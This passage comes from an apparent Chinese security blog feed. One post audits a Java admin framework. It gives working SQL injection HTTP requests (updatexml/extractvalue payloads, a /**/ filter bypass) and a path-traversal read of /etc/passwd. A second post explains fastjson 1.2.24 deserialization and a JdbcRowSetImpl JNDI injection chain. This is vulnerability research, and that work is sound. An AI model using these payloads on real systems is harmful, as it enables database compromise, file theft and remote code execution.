class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/role/authUser/selectUser/100<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=6ea4c4cf-c715-4be1-8388-30b7dc810de9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-sas">pageSize=10<span class="hljs-variable">&amp;pageNum</span>=1<span class="hljs-variable">&amp;orderByColumn</span>=createTime<span class="hljs-variable">&amp;isAsc</span>=desc<span class="hljs-variable">&amp;roleId</span>=100<span class="hljs-variable">&amp;loginName</span>=<span class="hljs-variable">&amp;phonenumber</span>=<span class="hljs-variable">&amp;params</span>[dataScope]=<span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> updatexml(1,concat(0x7e,(<span class="hljs-keyword">SELECT</span> database())),0x7e))</span><br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20240307150734573.png" alt="image-20240307150734573"></p><h3 id="3-7-查询部门列表："><a href="#3-7-查询部门列表：" class="headerlink" title="3.7 查询部门列表："></a>3.7 查询部门列表：</h3><p>请求路径为：<code>/system/dept/list</code></p><p><img src="/./../blog_image/image-20240307152149553.png" alt="image-20240307152149553"></p><p>dept对象是可控的，因此可以直接梭哈：</p><p><img src="/./../blog_image/image-20240307152217690.png" alt="image-20240307152217690"></p><p>注入点一样params[dataScope]，还可以使用updatexml进行注入。poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/dept/list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>101<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/dept<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=6ea4c4cf-c715-4be1-8388-30b7dc810de9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-stylus">deptName=<span class="hljs-number">123</span>&amp;status=&amp;params<span class="hljs-selector-attr">[dataScope]</span>=<span class="hljs-built_in">and</span>(select <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(SELECT <span class="hljs-built_in">database</span>())),<span class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20240307152453369.png" alt="image-20240307152453369"></p><h3 id="3-8-修改部门状态："><a href="#3-8-修改部门状态：" class="headerlink" title="3.8 修改部门状态："></a>3.8 修改部门状态：</h3><p>请求路径为：<code>/system/dept/edit</code></p><p><img src="/./../blog_image/image-20240307152759836.png" alt="image-20240307152759836"></p><p>注入点为<code>dept_id</code>。</p><p>controller层接口如图所示：</p><p><img src="/./../blog_image/image-20240307152925916.png" alt="image-20240307152925916"></p><p>这个dept是从前端过来，并且是可控的，但是调用流程有点多，存在多个循环。</p><p><img src="/./../blog_image/image-20240307153058194.png" alt="image-20240307153058194"></p><p>这个的注入点是<code>ancestors</code>，前端传入的string类型，这里根据string字符串根据<code>,</code>进行切割。因此可以构造成：</p><p><code>0)or(extractvalue(1,concat((select user()))));#</code></p><p>不知道为什么使用select version会显示不全。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/dept/edit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>113<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/dept/edit/101<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=721a661a-97f4-44bf-acaa-3f1e43c0b313<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-apache"><span class="hljs-attribute">DeptName</span>=<span class="hljs-number">1</span>&amp;DeptId=<span class="hljs-number">100</span>&amp;ParentId=<span class="hljs-number">12</span>&amp;Status=<span class="hljs-number">0</span>&amp;OrderNum=<span class="hljs-number">1</span>&amp;ancestors=<span class="hljs-number">0</span>)or(extractvalue(<span class="hljs-number">1</span>,concat((select user()))));#</span><br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20240309101125037.png" alt="image-20240309101125037"></p><h3 id="3-9-生成表-版本4-7-5："><a href="#3-9-生成表-版本4-7-5：" class="headerlink" title="3.9 生成表 版本4.7.5："></a>3.9 生成表 版本4.7.5：</h3><p>存在硬编码：</p><p><img src="/./../blog_image/image-20240309112838718.png" alt="image-20240309112838718"></p><p>service层：</p><p><img src="/./../blog_image/image-20240309112905611.png" alt="image-20240309112905611"></p><p>controller层：</p><p>路径为<code>/tool/gen/createTable</code></p><p><img src="/./../blog_image/image-20240309112935099.png" alt="image-20240309112935099"></p><p>首先会判断当前sql是否存在sql注入：</p><p><img src="/./../blog_image/image-20240309113029589.png" alt="image-20240309113029589"></p><p>根据这个<code>SQL_REGEX</code>以<code>|</code>分割获取所有的关键字</p><p>然后调用stringutils的方法，这个方法是获取当前第二个参数在第一个参数中匹配到的字符串的第一个下标，如<code>abcd b</code>，匹配到了b所以返回第一个b字符串的下标<code>1</code>。</p><p><img src="/./../blog_image/image-20240309113248298.png" alt="image-20240309113248298"></p><p>所以当这个匹配到则返回的结果是大于-1，则表明存在sql注入。</p><p>根据切片获取到的sqlkeywords的list集合是<img src="/./../blog_image/image-20240309135446759.png" alt="image-20240309135446759"></p><p>因此可以使用<code>select/**/</code>这样去绕过空格检测。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/tool/gen/createTable</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>iframe<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=8b84098e-2440-457e-9770-2f51a5afe81e<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>142<br><br><span class="language-pgsql"><span class="hljs-keyword">sql</span>=<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">table</span><span class="hljs-comment">/**/</span>sad<span class="hljs-comment">/**/</span><span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>version()),<span class="hljs-number">0x7e</span>));</span><br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20240309115001668.png" alt="image-20240309115001668"></p><h3 id="3-10-组合拳-定时任务-sql注入-rce："><a href="#3-10-组合拳-定时任务-sql注入-rce：" class="headerlink" title="3.10 组合拳 定时任务+sql注入 rce："></a>3.10 组合拳 定时任务+sql注入 rce：</h3><h2 id="4-任意文件读取："><a href="#4-任意文件读取：" class="headerlink" title="4. 任意文件读取："></a>4. 任意文件读取：</h2><p>版本小于<code>4.5.1</code></p><p>路径为：<code>/common/download/resource?resource=/profile/../../../../etc/passwd</code></p><p><img src="/./../blog_image/image-20240309111346024.png" alt="image-20240309111346024"></p><p>处理逻辑主要获取到最后一个<code>profile</code>然后截取后面的路径进行拼接。</p><p>本地资源这个方法不存在校验文件是否合法，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/common/download/resource?resource=/profile/../../../</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>iframe<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/index<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=53976028-ac1b-48fd-840e-ddf217174015<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>可以实现读取任意文件。</p><p><img src="/./../blog_image/image-20240309111451591.png" alt="image-20240309111451591"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson 反序列化基础一(1.2.24)</title>
    <link href="/2024/04/21/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E4%B8%80-1-2-24/"/>
    <url>/2024/04/21/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E4%B8%80-1-2-24/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-基本使用："><a href="#0x01-基本使用：" class="headerlink" title="0x01 基本使用："></a>0x01 基本使用：</h1><p>编写一个实体类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hme.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h2><p>使用<code>JSON.toJSONString(student)</code>这个方法，可以返回一个json字符串。</p><p>如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-number">23</span>,<span class="hljs-string">&quot;张三&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(student);<br>    System.out.println(jsonString);<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/./../blog_image/image-20240408101152021.png" alt="image-20240408101152021"></p><p>添加了<code>SerializerFeature.WriteClassName</code>后再次输出，就会多了<code>@type</code>。</p><p><img src="/./../blog_image/image-20240408101210841.png" alt="image-20240408101210841"></p><h2 id="反序列化："><a href="#反序列化：" class="headerlink" title="反序列化："></a>反序列化：</h2><p>反序列化主要是<code>parse</code>和<code>parseObject</code>这两个方法。</p><h3 id="parse方法："><a href="#parse方法：" class="headerlink" title="parse方法："></a>parse方法：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.hme.entity.Student\&quot;,\&quot;age\&quot;:23,\&quot;name\&quot;:\&quot;张三\&quot;&#125;&quot;</span>;<br>System.out.println(<span class="hljs-string">&quot;========================&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;反序列化一：&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(str);<br>System.out.println(parse);<br></code></pre></td></tr></table></figure><p>使用<code>@type</code>指定类型，然后使用<code>parse</code>进行反序列化，结果会输出：</p><p><img src="/./../blog_image/image-20240408101235242.png" alt="image-20240408101235242"></p><p>总结：</p><blockquote><p>对于parse(json字符串)，结果会调用对应的set方法，以及构造函数，并且会调用静态方法，构造代码块。</p></blockquote><h3 id="parseObject方法："><a href="#parseObject方法：" class="headerlink" title="parseObject方法："></a>parseObject方法：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.hme.entity.Student\&quot;,\&quot;age\&quot;:23,\&quot;name\&quot;:\&quot;张三\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(str);<br>        System.out.println(parse);<br>        System.out.println(<span class="hljs-string">&quot;========================&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;反序列化二(parseObject)：&quot;</span>);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(str);<br>        System.out.println(jsonObject);<br></code></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/./../blog_image/image-20240408102009020.png" alt="image-20240408102009020"></p><p>结论：</p><blockquote><p>JSON.parseObject会调用对应的对应的set和get方法，以及构造方法和构造代码块。</p></blockquote><p>如果指定类，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-string">&quot;反序列化三(parseObject + 类)：&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> JSON.parseObject(str, Student.class);<br>        System.out.println(student);<br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/./../blog_image/image-20240408102132644.png" alt="image-20240408102132644"></p><p>结论：</p><blockquote><p>使用parseObject(str,类.class)则会直接返回该类的实例，调用构造代码块，构造函数，以及set方法。</p></blockquote><h2 id="Feature-SupportNonPublicField："><a href="#Feature-SupportNonPublicField：" class="headerlink" title="Feature.SupportNonPublicField："></a>Feature.SupportNonPublicField：</h2><p>如果我们把name的set方法去掉，那么字段不会有结果，输出为null。<img src="/./../blog_image/image-20240408105057482.png" alt="image-20240408105057482"></p><p>因为fastjson就是调用set方法去赋值的，对于我们的私有变量，没有set方法，所以不能直接赋值，而使用了<code>Feature.SupportNonPublicField</code>后就会调用反射去进行赋值：</p><p><img src="/./../blog_image/image-20240408110831128.png" alt="image-20240408110831128"></p><p>总结：</p><blockquote><p>使用fastjson，如果对象的私有变量没有使用编写set方法，fastjson是默认不能进行赋值。而添加了Feature.SupportNonPublicField，可以在没有set方法的条件下进行赋值。</p></blockquote><h1 id="0x02-代码实现流程："><a href="#0x02-代码实现流程：" class="headerlink" title="0x02 代码实现流程："></a>0x02 代码实现流程：</h1><p>获取key：</p><p>在<code>DefaultJSONParser</code>的<code>parseObject</code>函数中：</p><p><img src="/./../blog_image/image-20231211204647590.png" alt="image-20231211204647590"></p><p>如果当key是<code>JSON.DEFAULT_TYPE_KEY</code>（常量，是@type）则获取当前<code>@type</code>的值即json的vale，然后调用<code>TypeUtils</code>中加载器去加载当前的<code>typeName</code></p><p><img src="/./../blog_image/image-20231211204558260.png" alt="image-20231211204558260"></p><p>加载过程在<code>TypeUtils.loadClass</code>中</p><p>mappings中存在当前这些加载器：<br><img src="/./../blog_image/image-20231211205130793.png" alt="image-20231211205130793"></p><p>当前传入的加载器在这个map中不存在则继续往下，然后使用当前线程去创建另一个加载器：</p><p><img src="/./../blog_image/image-20231211205415823.png" alt="image-20231211205415823"></p><p>然后会把这个加载器放进map中,最终返回。</p><p>返回ParseConfig类的getDeserializer中走到最后一步会创建javabean对象。</p><p>在parseConfig中最后会调用<code>JavaBeanDeserialize</code>函数去创建javabean </p><p><img src="/./../blog_image/image-20231214163722619.png" alt="image-20231214163722619"></p><p>在<code>createJavaBeanDeserializer</code>方法中会采用asm技术去操作class，从而去动态生成对象。</p><p><code>JavaBeanInfo</code>函数中首先会遍历所有的方法获取到对应类型的set方法和get方法，然后去获取字段，主要是获取public,static的字段。</p><p>构造poc：</p><p>首先需要指定类型，因此使用@type指定序列化的类，这里选用<code>com.sun.rowset.JdbcRowSetImpl</code>，判断需要调用是get还是set方法，这里选用set方法。</p><p><img src="/./../blog_image/image-20231214165957071.png" alt="image-20231214165957071"></p><p>这里toJSON最后才会调用set方法，如果调用get方法，前面可能会出错。</p><p>当我们指定字段<code>dataSourceName</code>就会调用<code>setDataSourceName</code>方法，如图，将我们的地址传入了：</p><p><img src="/./../blog_image/image-20231214170746290.png" alt="image-20231214170746290"></p><p>而<code>setAutoCommit</code>方法也是一样：</p><p><img src="/./../blog_image/image-20231214170902837.png" alt="image-20231214170902837"></p><p>之后会调用connect()方法</p><p>在connect方法中会调用<code>getDataSourceName</code>的方法，而这个DataSourceName参数是可控的，我们可以传入的，因此实现了jndi注入了。</p><p><img src="/./../blog_image/image-20231214171048392.png" alt="image-20231214171048392"></p><p>在yakit中开启一个ldap服务，执行命令为calc，如图所示：</p><p><img src="/./../blog_image/image-20231214171307785.png" alt="image-20231214171307785"></p><p>从而实现了运行任意命令。</p><p>小结：</p><blockquote><p><strong>下面直接引用结论，Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用：</strong></p><p>满足条件的setter：</p><ul><li>非静态函数</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>满足条件的getter：</p><ul><li>非静态方法</li><li>无参数</li><li><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></li></ul></blockquote><h1 id="0x03-TemplatesImpl利用链："><a href="#0x03-TemplatesImpl利用链：" class="headerlink" title="0x03 TemplatesImpl利用链："></a>0x03 TemplatesImpl利用链：</h1><h2 id="分析以及exp编写："><a href="#分析以及exp编写：" class="headerlink" 